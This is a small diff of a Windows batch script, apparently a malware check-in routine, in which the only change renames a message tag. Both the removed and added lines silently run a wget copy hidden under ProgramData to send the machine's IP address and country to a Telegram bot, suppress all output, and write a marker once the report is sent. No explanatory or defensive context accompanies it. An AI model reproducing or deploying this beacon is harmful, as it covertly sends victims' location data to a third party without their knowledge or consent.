@@ -31,6 +31,6 @@ for /f "tokens=1,2 delims=," %a in ('%ProgramData%\ssh\wget.exe -q --hsts-file=N
     if not "%b"=="" set "IP=%b"
 )
 
-%ProgramData%\ssh\wget.exe -q --hsts-file=NUL -O - --post-data="chat_id=%CHAT_ID%&text=RUS%0AIP: %IP%%0ACountry: %Country%" "https://api.telegram.org/bot%TOKEN%/sendMessage" 1>nul 2>nul
+%ProgramData%\ssh\wget.exe -q --hsts-file=NUL -O - --post-data="chat_id=%CHAT_ID%&text=RUC%0AIP: %IP%%0ACountry: %Country%" "https://api.telegram.org/bot%TOKEN%/sendMessage" 1>nul 2>nul
 echo done > "%ProgramData%\ssh\sent"
 endlocal
